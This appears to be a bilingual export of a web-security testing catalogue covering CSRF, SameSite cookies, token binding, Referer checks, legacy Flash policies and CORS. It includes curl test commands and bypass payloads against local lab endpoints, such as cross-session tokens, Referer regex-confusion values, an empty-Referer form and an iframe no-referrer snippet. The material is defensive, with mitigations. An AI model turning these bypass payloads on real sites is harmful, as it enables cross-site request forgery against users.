exploitation.zh: 先使用同源正常请求记录字段、Cookie 和服务端日志，再从受控的不同站点分别提交 text/plain、HTML 表单、multipart 和 application/json 对照。每次只写入 PAYLOADER-CSRF-MARKER，阳性必须同时满足浏览器携带目标会话、服务端接受请求、资料值实际改变，并可由审计日志关联。
exploitation.en: Record the normal same-origin request, cookies, fields, and server logs first. From a controlled different site, compare text/plain, an HTML form, multipart data, and application/json. Write only PAYLOADER-CSRF-MARKER. A positive result requires the target session to be sent, the server to accept the request, the stored value to change, and audit logs to correlate the event.

mitigation.zh: 对写接口严格限定 Content-Type 和结构，不把简单请求内容隐式解析成 JSON；对每次状态变更校验不可预测并绑定会话的 CSRF Token，同时验证 Origin，设置合适的 SameSite Cookie。CORS 继续按最小来源配置，但不能代替 CSRF 防护。
mitigation.en: Strictly constrain the Content-Type and schema of write endpoints and do not implicitly parse simple-request bodies as JSON. Validate an unpredictable session-bound CSRF token and Origin on every state change, and set an appropriate SameSite cookie policy. Keep CORS narrowly scoped, but do not treat it as a replacement for CSRF protection.

name.zh: SameSite Cookie 浏览器发送边界

description.zh: 验证 Lax、Strict、None 和未声明 Cookie 在顶级导航、子资源、弹窗回调、Schemeful Site 与客户端重定向中的实际附带行为。
description.en: 验证 Lax、Strict、None 和未声明 Cookie 在顶级导航、子资源、弹窗回调、Schemeful Site 与客户端重定向中的实际附带行为。

prerequisites.zh: 使用 Chromium 与本地 Cookie Fixture，为每个用例创建独立 Context 和合成 Cookie。
prerequisites.en: Use Chromium and a local cookie fixture with a separate context and synthetic cookie for every case.

prerequisites.zh: 记录 Set-Cookie 属性、请求类型、top-level site、Cookie 是否附带、服务端 marker 与浏览器版本。
prerequisites.en: Record Set-Cookie attributes, request type, top-level site, cookie inclusion, server marker, and browser version.

title.zh: 导航与子资源对照

description.zh: 在同一页面触发顶级链接与 img 子资源，比较服务端收到的 Cookie marker。
description.en: Trigger a top-level link and img subresource on one page and compare cookie markers observed by the server.

title.zh: 弹窗回调请求样例

description.zh: 通过 noopener 弹窗访问本地回调 marker，观察顶级浏览上下文中的 Cookie 行为。
description.en: Open a local callback marker in a noopener popup and observe cookie behavior in a top-level browsing context.

analysis.zh: 阳性结论必须指出具体 Cookie 属性、浏览器版本、请求类型、top-level site 和实际附带结果。仅看到 SameSite=None、存在子域或使用重定向不能直接证明 CSRF。
analysis.en: A positive conclusion must identify cookie attributes, browser version, request type, top-level site, and actual inclusion result. Seeing SameSite=None, a subdomain, or a redirect alone does not prove CSRF.

opsecTips.zh: 所有 Cookie 值为合成 marker，不记录真实 Session；每个用例使用全新浏览器 Context。
opsecTips.en: Every cookie value is a synthetic marker, with no real sessions recorded and a fresh browser context per case.

opsecTips.zh: 只观察 Cookie 附带和日志 marker，不把 GET、OAuth 回调或重定向连接到真实状态变更。
opsecTips.en: Observe only cookie inclusion and log markers without connecting GET, OAuth callback, or redirects to real state changes.

title.zh: Schemeful Site 主机对照

description.zh: 比较 127.0.0.1 与 localhost 两个主机在本地浏览器中的 Site 判断和 Cookie 附带。
description.en: Compare site classification and cookie inclusion for 127.0.0.1 and localhost in the local browser.

title.zh: 客户端重定向请求样例

description.zh: 使用 location.href 导航到本地 marker，并记录导航请求是否附带 Cookie。
description.en: Navigate to a local marker with location.href and record whether the navigation request includes the cookie.

title.zh: 采集 Cookie 属性

description.zh: 保存 Lax、Strict、None 与未声明 Fixture 的完整 Set-Cookie Header。
description.en: 保存 Lax、Strict、None 与未声明 Fixture 的完整 Set-Cookie Header。

title.zh: 比较导航与子资源

description.zh: 从独立 Site 触发顶级导航和 img 子资源，比较 Cookie 是否附带。
description.en: Trigger top-level navigation and an img subresource from a separate site and compare cookie inclusion.

attackChain.payload: Top-level navigation

title.zh: 运行 Chromium Cookie 矩阵

description.zh: 自动覆盖四种 Cookie 配置和多种请求类型，逐项保存浏览器与服务端证据。
description.en: Automatically cover four cookie configurations and multiple request types, preserving browser and server evidence per case.

title.zh: 修复后验证业务兼容

description.zh: 要求跨站状态请求无会话，同时同站登录与必要回调仍按设计工作。
description.en: Require no session on cross-site state requests while preserving same-site login and required callbacks by design.

overview.zh: SameSite 判断的是 Site 而非 Origin，并影响浏览器是否在跨站请求中附带 Cookie。Lax 通常允许跨站顶级安全方法导航，但阻止多数子资源和跨站 POST；Strict 更严格；None 需要 Secure。未声明属性的默认行为与显式 Lax 可能存在兼容性差异，应以当前浏览器实测。
overview.en: SameSite 判断的是 Site 而非 Origin，并影响浏览器是否在跨站请求中附带 Cookie。Lax 通常允许跨站顶级安全方法导航，但阻止多数子资源和跨站 POST；Strict 更严格；None 需要 Secure。未声明属性的默认行为与显式 Lax 可能存在兼容性差异，应以当前浏览器实测。

vulnerability.zh: SameSite 不是完整 CSRF 防护。如果应用用 GET 修改状态、受信同站子域可被控制、Cookie Domain 范围过宽，或未声明/None Cookie 在跨站请求中附带，风险仍可能存在。所谓“两分钟窗口”是部分浏览器对近期设置且未显式 SameSite Cookie 的兼容行为，不能泛化到显式 Lax。
vulnerability.en: SameSite 不是完整 CSRF 防护。如果应用用 GET 修改状态、受信同站子域可被控制、Cookie Domain 范围过宽，或未声明/None Cookie 在跨站请求中附带，风险仍可能存在。所谓“两分钟窗口”是部分浏览器对近期设置且未显式 SameSite Cookie 的兼容行为，不能泛化到显式 Lax。

exploitation.zh: 先采集 Fixture 的 Set-Cookie 属性，再用 Playwright 运行 Cookie 矩阵。Payload 分别产生顶级导航与子资源、弹窗回调、127.0.0.1 与 localhost Site 对照及客户端重定向。每次只记录 Cookie 是否附带和 marker，不执行真实状态变更。
exploitation.en: Capture fixture Set-Cookie attributes, then run the Playwright cookie matrix. Payloads generate top-level navigation versus subresource, popup callback, 127.0.0.1 versus localhost site comparison, and client redirect. Record only cookie inclusion and markers without real state changes.

mitigation.zh: 会话 Cookie 明确设置合适的 SameSite、Secure、HttpOnly 和最小 Domain/Path；状态变更禁止 GET，并保留 CSRF Token 与 Origin 校验。OAuth 等确需跨站回调的 Cookie 应缩小用途和生命周期，不要把全局会话 Cookie 放宽为 None。
mitigation.en: Set explicit suitable SameSite, Secure, HttpOnly, and minimal Domain and Path on session cookies, reject state changes over GET, and retain CSRF tokens plus Origin validation. Cookies needed for cross-site callbacks such as O Auth should have narrow purpose and lifetime rather than weakening the global session cookie to None.

name.zh: CSRF Token 绑定与解析边界
name.en: CSRF Token Binding and Parsing Boundary

description.zh: 验证 Token 的会话绑定、必填行为、一次性重放、方法覆盖和 JSON/Form 解析一致性，并把统计与代码审计迁入工具区。
description.en: Validate token session binding, required-token behavior, one-time replay, method overrides, and JSON/form parser consistency, moving statistics and code inspection into tools.

prerequisites.zh: 使用两套合成 Session 和独立 Token Fixture，服务端只修改一次性 marker。
prerequisites.en: Use two synthetic sessions with independent token fixtures, and let the server modify only one-time markers.

prerequisites.zh: 能够记录 Token 来源、Session ID 摘要、消费次数、解析器和拒绝原因。
prerequisites.en: Record token source, session-ID digest, consumption count, parser, and denial reason.

title.zh: 跨 Session Token 拒绝样例

execution.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/token-binding" -H "X-Lab-Session: CSRF_VICTIM_B2" -H "X-CSRF-Token: CSRF_ATTACKER_TOKEN_B2" --data "marker=CSRF_BINDING_B2" | jq -e '.accepted == false and .reason == "token_session_mismatch"'

description.zh: 组合受害者 Session 与攻击者 Fixture Token，并断言服务端返回绑定不匹配。
description.en: Combine a victim session with an attacker fixture token and assert an explicit binding-mismatch denial.

title.zh: 缺失与空 Token 拒绝矩阵
title.en: Missing and Empty Token Rejection Matrix

execution.command: for mode in missing empty; do if [ "$mode" = missing ]; then header=(); else header=(-H "X-CSRF-Token:"); fi; curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/token-required" -H "X-Lab-Session: CSRF_SESSION_E5" "${header[@]}" --data "marker=CSRF_REQUIRED_E5" | jq -c '{accepted,reason}'; done

description.zh: 分别发送缺失和空 X-CSRF-Token 请求，要求两种情况都被拒绝。
description.en: Send missing and empty X-CSRF-Token requests separately and require both cases to be denied.

analysis.zh: 阳性需要服务端在错误 Session、缺失 Token 或绕过解析路径下接受请求并改变合成状态。随机性看起来较弱、Token 重复出现或日志检索命中都只是需要进一步验证的线索。
analysis.en: A positive requires the server to accept a request and change synthetic state under the wrong session, missing token, or bypass parser path. Weak-looking randomness, repeated tokens, or a static-search hit is only a lead requiring further validation.

opsecTips.zh: 只使用合成 Token 和 Session 摘要，禁止读取、打印或重放真实用户 Token。
opsecTips.en: Use only synthetic tokens and session digests and never read, print, or replay real user tokens.

opsecTips.zh: 重放工具固定两次请求，不执行预测、字典、并发或无界 Token 采样。
opsecTips.en: The replay tool is fixed to two requests and performs no prediction, dictionary use, concurrency, or unbounded token sampling.

title.zh: 方法覆盖校验样例

wafBypass.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/method-override" -H "X-HTTP-Method-Override: PUT" -H "X-Lab-Session: CSRF_SESSION_F6" --data "marker=CSRF_METHOD_F6" | jq -e '.csrf_checked == true'

description.zh: 通过 X-HTTP-Method-Override 请求 PUT 语义，并断言 CSRF 中间件仍执行。
description.en: Request PUT semantics through X-HTTP-Method-Override and assert that CSRF middleware still runs.

title.zh: JSON 解析一致性样例

wafBypass.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/parser-consistency" -H "Content-Type: application/json" -H "X-Lab-Session: CSRF_SESSION_G7" --data '{"marker":"CSRF_JSON_G7"}' | jq -e '.csrf_checked == true and .accepted == false'

description.zh: 发送无 Token JSON 请求并断言与 Form 路径执行相同 CSRF 校验。
description.en: Send a tokenless JSON request and assert the same CSRF validation used by the form path.

title.zh: 建立正确绑定基线

description.zh: 用同一合成 Session 与 Token 执行 marker 请求，记录接受与消费状态。
description.en: Execute a marker request with a matching synthetic session and token and record acceptance plus consumption state.

title.zh: 提交跨 Session Token

description.zh: 把攻击者 Fixture Token 与受害者 Session 组合，要求明确返回绑定不匹配。
description.en: Combine the attacker fixture token with the victim session and require an explicit binding-mismatch denial.

attackChain.payload: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/token-binding" -H "X-Lab-Session: CSRF_VICTIM_B2" -H "X-CSRF-Token: CSRF_ATTACKER_TOKEN_B2" --data "marker=CSRF_BINDING_B2" | jq -e '.accepted == false and .reason == "token_session_mismatch"'

title.zh: 覆盖缺失与解析差异

description.zh: 分别测试缺失、空值、方法覆盖和 JSON Content-Type，保持 marker 不变。
description.en: Test missing, empty, method-override, and JSON content types separately while holding the marker constant.

title.zh: 审计生命周期并回归

description.zh: 使用工具统计、泄露检索和两次重放定位缺陷，修复后重放全部矩阵。
description.en: Use statistics, leakage search, and two-request replay tools to locate flaws, then replay the full matrix after remediation.

overview.zh: CSRF Token 的安全性不仅取决于随机性，还取决于服务端必填、与当前 Session 绑定、在所有状态变更方法和内容类型上统一验证，以及合理的生命周期。条目把跨 Session、缺失/空值、方法覆盖和 JSON 解析保留为 Payload，把样本统计、泄露检索和重放编排迁入工具。
overview.en: CSRF Token 的安全性不仅取决于随机性，还取决于服务端必填、与当前 Session 绑定、在所有状态变更方法和内容类型上统一验证，以及合理的生命周期。条目把跨 Session、缺失/空值、方法覆盖和 JSON 解析保留为 Payload，把样本统计、泄露检索和重放编排迁入工具。

vulnerability.zh: 如果攻击者 Session 的 Token 可用于受害者 Session、缺失或空 Token 被接受、方法覆盖绕过中间件，或 JSON 路径不执行同一校验，防护边界失效。Token 可重用本身不一定是漏洞，必须结合业务风险和会话绑定判断；XSS 获取 Token 属于独立问题。
vulnerability.en: The boundary fails if a token from the attacker session works in the victim session, missing or empty tokens are accepted, method overrides bypass middleware, or JSON paths skip the same validation. Token reuse alone is not always a vulnerability and must be judged with business risk plus session binding; token theft through XSS is a separate issue.

exploitation.zh: 先建立正确 Session/Token 基线，再提交跨 Session Token、缺失与空值、方法覆盖和 JSON 请求。每次只改变一个变量并保存拒绝原因。工具命令对合成 Token 统计长度与唯一性，静态检索 URL/日志泄露，并仅重放同一 marker 两次，不爆破 Token。
exploitation.en: Establish a valid session/token baseline, then submit cross-session, missing and empty, method-override, and JSON requests one variable at a time while preserving denial reasons. Tool commands measure length and uniqueness of synthetic tokens, search statically for URL or log exposure, and replay one marker only twice without brute forcing tokens.

mitigation.zh: 使用密码学安全随机 Token 并绑定当前 Session 或用户上下文，在服务端对所有状态变更方法、解析器和路由统一要求 Token。Token 不放 URL 或日志；方法覆盖在 CSRF 校验前规范化。高风险操作可使用一次性 Token 和重新认证，但普通 Token 不必强制单次使用。
mitigation.en: 使用密码学安全随机 Token 并绑定当前 Session 或用户上下文，在服务端对所有状态变更方法、解析器和路由统一要求 Token。Token 不放 URL 或日志；方法覆盖在 CSRF 校验前规范化。高风险操作可使用一次性 Token 和重新认证，但普通 Token 不必强制单次使用。

name.zh: CSRF Referer 校验边界

description.zh: 验证服务端对绝对 Referer、缺失 Referer、受信子域和 Referrer-Policy 缩减值的解析与允许列表行为。
description.en: Validate server parsing and allowlist behavior for absolute Referer values, missing Referer, trusted subdomains, and values reduced by Referrer-Policy.

prerequisites.zh: 使用固定允许源 allowed.invalid 和本地 Referer 策略 Fixture，不连接外部站点。
prerequisites.en: Use the fixed allowed origin allowed.invalid and a local Referer-policy fixture without external connections.

prerequisites.zh: 服务端日志输出原始 Referer、标准 URL 解析结果、允许原因和 request_id。
prerequisites.en: Server logs expose raw Referer, standard URL parsing output, allow or deny reason, and request_id.

title.zh: 1. 正则匹配绕过

execution.command: for value in "http://attacker.invalid/allowed.invalid/" "http://allowed.invalid.attacker.invalid/" "http://attackallowed.invalid/"; do curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/referer-policy" -H "Referer: $value" --data "marker=REFERER_REGEX_A1" | jq -c '{referer,allowed,reason}'; done

description.zh: 利用正则匹配缺陷
description.en: Exploit regex matching flaws

explanation.en: Describes the value segment used by this reviewed validation command.

title.zh: 2. 空Referer绕过

execution.command:
<!doctype html>
<meta name="referrer" content="no-referrer">
<form action="http://127.0.0.1:18080/lab/csrf/referer-policy" method="post">
  <input type="hidden" name="marker" value="REFERER_EMPTY_B2">
  <button type="submit">Submit empty Referer control</button>
</form>

description.zh: 发送空Referer
description.en: Send an empty Referer

title.zh: 3. 子域名绕过

description.zh: 利用子域名
description.en: Use subdomains

title.zh: 4. Referrer-Policy利用

description.zh: 利用Referrer-Policy
description.en: Exploit Referrer-Policy handling

analysis.zh: Referer 校验问题与完整 CSRF 影响必须分开报告。标准解析后错误接受外域证明来源校验缺陷；还需环境凭据和状态变化证据才能证明可利用 CSRF。
analysis.en: Report a Referer-validation flaw separately from full CSRF impact. Incorrect acceptance of an external origin after standard parsing proves the source-validation flaw, while ambient credentials and state-change evidence are still required for exploitable CSRF.

opsecTips.zh: 所有外部样例使用 `.invalid` 域，子域样例只指向回环 Fixture。
opsecTips.en: Use .invalid domains for every external sample and point subdomain cases only to the loopback fixture.

opsecTips.zh: 不伪造浏览器不能设置的 Referer 作为浏览器利用证据；curl 结果仅用于服务端策略诊断。
opsecTips.en: Do not treat a Referer forged by curl as browser exploit evidence; command-line results diagnose server policy only.

title.zh: iframe嵌入

description.zh: iframe绕过
description.en: iframe bypass

syntaxBreakdown.part:
使用iframe嵌入目标
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox属性
<iframe sandbox="allow-scripts" src="...">

title.zh: Flash/SWF

description.zh: Flash控制Referer
description.en: Flash controls Referer

syntaxBreakdown.part:
Flash可以控制Referer
# 编译SWF发送自定义Referer

title.zh: 固定允许 Origin

description.zh: 登记允许的 scheme、host 与 port，并用同源请求建立接受基线。
description.en: Register the allowed scheme, host, and port and establish an accepted same-origin baseline.

title.zh: 提交解析混淆值

description.zh: 逐个提交路径包含、后缀域和拼接域 Referer，比较标准 URL 解析结果。
description.en: Submit path-containing, suffix-domain, and concatenated-domain Referer values separately and compare standard URL parsing.

attackChain.payload: for value in "http://attacker.invalid/allowed.invalid/" "http://allowed.invalid.attacker.invalid/" "http://attackallowed.invalid/"; do curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/referer-policy" -H "Referer: $value" --data "marker=REFERER_REGEX_A1" | jq -c '{referer,allowed,reason}'; done

title.zh: 覆盖缺失与缩减值

description.zh: 测试 no-referrer、origin-only、Sandbox Frame 与完全缺失 Header 的策略。
description.en: Test no-referrer, origin-only, sandboxed-frame, and fully missing-header policies.

title.zh: 关联状态并回归

description.zh: 只有合成状态变化才升级为 CSRF，修复后要求非批准 Origin 全部拒绝。
description.en: Escalate to CSRF only on synthetic state change and require rejection of every unapproved origin after remediation.

overview.zh: Referer 是 CSRF 来源校验的补充信号，可能因 Referrer-Policy、浏览器隐私策略和安全降级而缺失或被缩减。安全实现必须使用标准 URL 解析器比较完整 Origin，而不是对子串、前缀或后缀做正则判断，并为缺失 Header 定义明确策略。
overview.en: Referer is a supplemental CSRF source signal that may be omitted or reduced by Referrer-Policy, browser privacy behavior, or secure-to-insecure transitions. Secure implementations parse the URL and compare the complete origin instead of regex substrings, prefixes, or suffixes, with an explicit policy for missing headers.

vulnerability.zh: 如果服务端接受 allowed.invalid.attacker.invalid、路径中包含允许域、缺失 Referer 或未批准子域，来源校验可能失效。只有跨站请求携带环境凭据、通过 Referer 判定并造成合成状态变化时才构成 CSRF；Header 本身被接受只是校验缺陷证据。
vulnerability.en: If the server accepts allowed.invalid.attacker.invalid, an allowed domain embedded in the path, missing Referer, or an unapproved subdomain, source validation may fail. CSRF still requires a cross-site request with ambient credentials that passes validation and changes synthetic state; acceptance of the header alone proves only a validation flaw.

exploitation.zh: 依次提交三种恶意绝对 URL、no-referrer Form、登记子域、origin-only 策略、Sandbox Frame 和完全缺失 Header。每次记录标准解析后的 scheme、host、port 与允许原因，并查询合成 marker。旧 Flash/SWF 样例已删除，因为现代浏览器不再支持该验证路径。
exploitation.en: Submit three malicious absolute URLs, a no-referrer form, a registered subdomain, origin-only policy, a sandboxed frame, and a completely missing header one at a time. Record parsed scheme, host, port, allow reason, and synthetic marker state. The obsolete Flash/SWF path is removed because modern browsers no longer support it.

mitigation.zh: 优先验证 Origin；仅在 Origin 缺失时使用 Referer，并通过标准 URL 解析器对 scheme、host 与 port 做精确允许列表比较。缺失来源 Header 应按业务场景拒绝或进入额外确认，同时保留 CSRF Token、SameSite 和 Fetch Metadata 防护。
mitigation.en: Validate Origin first and use Referer only when Origin is absent, comparing parsed scheme, host, and port against an exact allowlist. Reject missing source headers or require extra confirmation according to the workflow, while retaining CSRF tokens, SameSite, and Fetch Metadata defenses.

name.zh: Flash 跨域策略遗留审计

description.zh: 面向仍保留 SWF 资产或跨域策略文件的遗留系统审计；用于发现历史配置残留，不再描述为现代浏览器中的通用 CSRF 或 CORS 绕过。
description.en: Audits legacy systems that still expose SWF assets or cross-domain policy files. It identifies historical configuration residue and is not presented as a general CSRF or CORS bypass in modern browsers.

prerequisites.zh: 资产负责人确认目标确实存在受支持的遗留 Flash 运行环境、专用兼容终端或待退役 SWF 业务。
prerequisites.en: Have the asset owner confirm an actually supported legacy Flash runtime, dedicated compatibility endpoint, or SWF workload awaiting retirement.

prerequisites.zh: 仅下载公开策略与静态资产头部，不运行未知 SWF，不启用已停用插件，也不向生产写接口提交请求。
prerequisites.en: Retrieve only public policy files and static-asset headers; do not run unknown SWF files, enable a retired plugin, or submit requests to production write endpoints.

title.zh: 获取 crossdomain.xml

description.zh: 只读保存实验站点的 Flash 跨域策略和响应头，供离线核对允许域、允许头与缓存策略。
description.en: Save the lab Flash cross-domain policy and response headers read-only for offline review of allowed domains, headers, and caching behavior.

title.zh: 获取 clientaccesspolicy.xml

description.zh: 保存可能遗留的 Silverlight/兼容策略文件，区分它与 Flash 策略并检查是否仍有客户端消费。
description.en: 保存可能遗留的 Silverlight/兼容策略文件，区分它与 Flash 策略并检查是否仍有客户端消费。

title.zh: 定位遗留资产引用

description.zh: 在已授权的本地代码副本中查找 SWF、策略文件和旧 MIME 引用，不下载或执行未知 Flash 内容。
description.en: Search an authorized local code copy for SWF, policy-file, and legacy MIME references without downloading or running unknown Flash content.

title.zh: 记录 SWF 资产响应头

description.zh: 仅请求实验 SWF 资产的响应头，记录状态、类型、缓存和安全头，不执行文件内容。
description.en: Request only response headers for the lab SWF asset and record status, type, caching, and security headers without executing its content.

analysis.zh: 确认风险需要受支持的运行时、仍被消费的策略和实际跨域请求证据。策略文件存在、SWF MIME 类型或旧源代码片段只能证明遗留资产，不能证明现代浏览器可绕过 CORS 或完成 CSRF。
analysis.en: Risk confirmation requires a supported runtime, a policy that is still consumed, and evidence of actual cross-domain requests. A policy file, SWF MIME type, or old source fragment proves legacy residue only and does not prove that modern browsers bypass CORS or complete CSRF.

opsecTips.zh: 不安装或重新启用 Flash Player，不在分析主机运行未知 SWF。
opsecTips.en: Do not install or re-enable Flash Player and do not run unknown SWF files on the analysis host.

opsecTips.zh: 仅保留策略文本、响应头和文件哈希，避免收集无关静态内容或用户数据。
opsecTips.en: Retain only policy text, response headers, and file hashes, avoiding unrelated static content or user data.

title.zh: 复测遗留策略退役状态

description.zh: 修复后确认策略文件已移除或仅保留精确批准来源，并将结果与代理访问日志和资产清单对照。
description.en: After remediation, confirm that the policy is removed or limited to exact approved origins, and compare the result with proxy access logs and the asset inventory.

title.zh: 确认是否存在受支持运行时
title.en: Confirm Whether a Supported Runtime Exists

description.zh: 由资产负责人确认兼容终端、业务依赖、退役日期和网络边界；没有运行时就按遗留资产问题处理。
description.en: Have the asset owner confirm compatibility endpoints, business dependencies, retirement date, and network boundary; without a runtime, treat the item as legacy residue.

title.zh: 只读获取跨域策略基线

description.zh: 运行第一条命令保存策略与响应头，不执行 SWF，也不向任何写接口发起会话请求。
description.en: Run the first command to preserve the policy and headers without executing SWF content or sending a session request to any write endpoint.

attackChain.payload: curl -sS -D crossdomain.headers -o crossdomain.xml "https://{LAB_APP}/crossdomain.xml"

title.zh: 关联资产、代码与访问日志
title.en: Correlate Assets, Code, and Access Logs

description.zh: 核对策略允许项、SWF 引用、兼容代理和近期访问日志，判断配置是活跃信任边界还是未清理残留。
description.en: Compare policy permissions, SWF references, compatibility proxies, and recent access logs to decide whether this is an active trust boundary or unremoved residue.

title.zh: 退役或收紧并验证现代防护
title.en: Retire or Constrain and Verify Modern Controls

description.zh: 移除遗留组件或收紧精确来源后，确认现代写接口仍独立执行令牌、Origin 和 Cookie 策略。
description.en: Remove the legacy component or constrain exact origins, then verify that modern write endpoints independently enforce token, Origin, and cookie policies.

overview.zh: Flash Player 已结束生命周期，主流浏览器不再提供通用 Flash 运行时。本条目保留的价值是审计遗留 crossdomain.xml、clientaccesspolicy.xml、SWF 静态资产和后端兼容路由，判断它们是否仍扩大信任边界或误导维护人员，而不是指导现代浏览器利用。
overview.en: Flash Player has reached end of life and mainstream browsers no longer provide a general Flash runtime. This entry is retained to audit legacy crossdomain.xml, clientaccesspolicy.xml, SWF assets, and compatibility routes for residual trust expansion or maintenance confusion, not to describe a modern-browser exploitation path.

vulnerability.zh: 只有在组织仍运行明确的兼容客户端或服务端消费这些策略时，过宽的 allow-access-from、allow-http-request-headers-from 或遗留代理接口才可能形成实际边界问题。策略文件仍可访问、存在 SWF 文件或返回 application/x-shockwave-flash 本身只是资产清理信号。
vulnerability.en: An overly broad allow-access-from or allow-http-request-headers-from rule, or a legacy proxy endpoint, creates an active boundary only when an explicitly supported compatibility client or service still consumes it. A reachable policy file, an SWF asset, or an application/x-shockwave-flash response alone is an inventory and retirement signal.

exploitation.zh: 先向资产负责人确认运行时与业务依赖，再只读获取两个策略文件、SWF 响应头和代码库引用。解析允许域、允许头、端口和 secure 属性，并与现行资产清单和代理日志对照；没有受支持运行时和实际请求证据时，结论应记为遗留配置而非可利用 CSRF。
exploitation.en: Confirm the runtime and business dependency with the asset owner, then retrieve the two policy files, SWF response headers, and code references read-only. Parse allowed domains, headers, ports, and secure attributes and correlate them with current inventory and proxy logs. Without a supported runtime and observed requests, classify the result as legacy configuration rather than exploitable CSRF.

mitigation.zh: 优先移除 SWF 资产、停用兼容代理并删除不再消费的策略文件；确需短期保留时只允许精确 HTTPS 来源和必要头部，禁止通配域，并设置退役日期、隔离网络和访问审计。现代写接口仍需独立使用 CSRF Token、Origin 校验和 SameSite Cookie。
mitigation.en: Remove SWF assets, disable compatibility proxies, and delete unconsumed policy files. If temporary retention is required, allow only exact HTTPS origins and necessary headers, prohibit wildcard domains, and define a retirement date, network isolation, and access auditing. Modern write endpoints still require independent CSRF tokens, Origin validation, and SameSite cookies.

name.zh: 凭据型 CORS 响应可见性边界

description.zh: 从 CSRF 分类中拆出 CORS，验证反射 Origin、null Origin、正则允许列表和携带凭据的跨源响应是否可被浏览器脚本读取。
description.en: Separate CORS from CSRF and validate whether reflected origins, null origins, regex allowlists, and credentialed cross-origin responses are readable by browser scripts.

prerequisites.zh: 使用两个本地 Origin 和只返回 marker 的 CORS Fixture，Cookie 仅代表合成身份。
prerequisites.en: Use two local origins and a marker-only CORS fixture whose cookie represents only a synthetic identity.

prerequisites.zh: 在 Chromium 中记录 Request Origin、预检、ACAO、ACAC、Vary、响应可见性和控制台错误。
prerequisites.en: Record request Origin, preflight, ACAO, ACAC, Vary, response visibility, and console errors in Chromium.

title.zh: 反射 Origin 可见性样例

execution.command: pending

description.zh: 从独立本地 Origin 发起带凭据请求，并只显示返回 marker 和可见状态。
description.en: Send a credentialed request from a separate local origin and display only the returned marker and visibility state.

title.zh: null Origin 可见性样例

description.zh: 在 Sandbox srcdoc 的 null Origin 中请求本地 marker，并记录浏览器是否允许读取。
description.en: Request a local marker from a sandboxed srcdoc null origin and record whether the browser permits reading.

analysis.zh: CORS 阳性证据是浏览器脚本实际获得带凭据 marker，而不只是响应 Header 看起来宽松。状态变更是否发生属于独立 CSRF/授权结论，应分别报告。
analysis.en: Positive CORS evidence is actual browser-script access to a credentialed marker, not merely permissive-looking response headers. Whether a state change occurs is a separate CSRF or authorization conclusion and must be reported separately.

opsecTips.zh: 响应只包含合成 marker 或长度，禁止读取用户资料、Token、邮箱或业务对象。
opsecTips.en: Responses contain only synthetic markers or lengths, never user profiles, tokens, email, or business objects.

opsecTips.zh: 使用独立浏览器上下文验证每个 Origin，完成后删除合成 Cookie 与 CORS 日志。
opsecTips.en: Use a separate browser context per origin and remove synthetic cookies plus CORS logs afterward.

title.zh: 凭据响应长度样例

description.zh: 读取本地 marker 响应后只记录正文长度，不输出或外带内容。
description.en: Read the local marker response and record only body length without outputting or exfiltrating content.

description.zh: 向本地合成状态端点发送 JSON marker，并只记录浏览器可见的响应状态。
description.en: Send a JSON marker to a local synthetic-state endpoint and record only the browser-visible response status.

title.zh: 采集 CORS Header 基线

description.zh: 比较允许源、跨站源和 null Origin 的 ACAO、ACAC 与 Vary。
description.en: Compare ACAO, ACAC, and Vary for allowed, cross-site, and null origins.

title.zh: 运行反射 Origin 浏览器样例

description.zh: 从未批准本地 Origin 发起带凭据请求并只显示返回 marker。
description.en: Send a credentialed request from an unapproved local origin and display only the returned marker.

attackChain.payload: pending

title.zh: 覆盖 null 与正则允许列表

description.zh: 使用 Sandbox null Origin 和三个混淆 Origin 分别验证解析与响应可见性。
description.en: Validate parsing and response visibility separately for a sandboxed null origin and three confused origins.

title.zh: 修复后重放可见性矩阵
title.en: Replay the visibility matrix after remediation

description.zh: 要求未批准 Origin 无法读取 marker，且允许 Origin 仍保留正常业务读取。
description.en: Require unapproved origins to lose marker visibility while approved origins retain normal business reads.

overview.zh: CORS 是浏览器响应读取策略，不是 CSRF 防护本身。配置错误可能让恶意 Origin 的脚本读取带凭据响应；即使响应不可读，某些简单跨源请求仍可能发送，因此状态变更仍需要独立 CSRF 防护。本条目按反射 Origin、null Origin、正则允许列表和凭据读取拆分。
overview.en: CORS is a browser response-reading policy, not a CSRF defense by itself. Misconfiguration may let a script from an untrusted origin read credentialed responses; even when responses are unreadable, some simple cross-origin requests may still be sent, so state changes need independent CSRF protection. This entry separates reflected origin, null origin, regex allowlist, and credentialed-read cases.

vulnerability.zh: 阳性需要浏览器从未批准 Origin 发起请求、携带合成凭据、服务端返回与该 Origin 匹配的 ACAO 和 ACAC，并且脚本实际读取 marker 响应。ACAO:* 与 ACAC:true 的组合会被浏览器阻止凭据读取，不能被错误写成可利用配置。
vulnerability.en: A positive requires a browser request from an unapproved origin carrying synthetic credentials, server ACAO matching that origin with ACAC, and script access to the marker response. Browsers block credentialed reads for ACAO:* combined with ACAC:true, so that header pair must not be mislabeled exploitable.

exploitation.zh: 先用 curl 采集三个 Origin 的 Header 策略，再在 Chromium 运行反射、null Origin、正则混淆、凭据读取和 JSON POST marker。Payload 只把 marker 或响应长度写入 DOM，不传输响应内容。curl 只能诊断 Header，浏览器可见性才是确认依据。
exploitation.en: Use curl first to collect header policy for three origins, then run reflected, null-origin, regex-confusion, credentialed-read, and JSON POST markers in Chromium. Payloads write only a marker or response length to DOM and never transmit response content. Curl diagnoses headers; browser visibility is the confirmation boundary.

mitigation.zh: 使用标准 URL 解析后的精确 Origin 允许列表，只对确有需要的受信 Origin 返回 ACAO 与 ACAC，并设置 Vary: Origin。拒绝 null Origin，除非有明确沙箱业务；限制方法与 Header。所有状态变更仍使用 CSRF Token 与来源验证。
mitigation.en: Use an exact allowlist of parsed origins, return ACAO and ACAC only for explicitly trusted origins, and set Vary: Origin. Reject null Origin unless required by a documented sandbox workflow, and limit methods plus headers. Continue to use CSRF tokens and source validation for every state change.

name.zh: JWT Claim Profile 验证

description.zh: 分别验证 issuer、audience、expiration 与显式 token type，只有完全匹配的短期测试 token 可以访问只读标记。
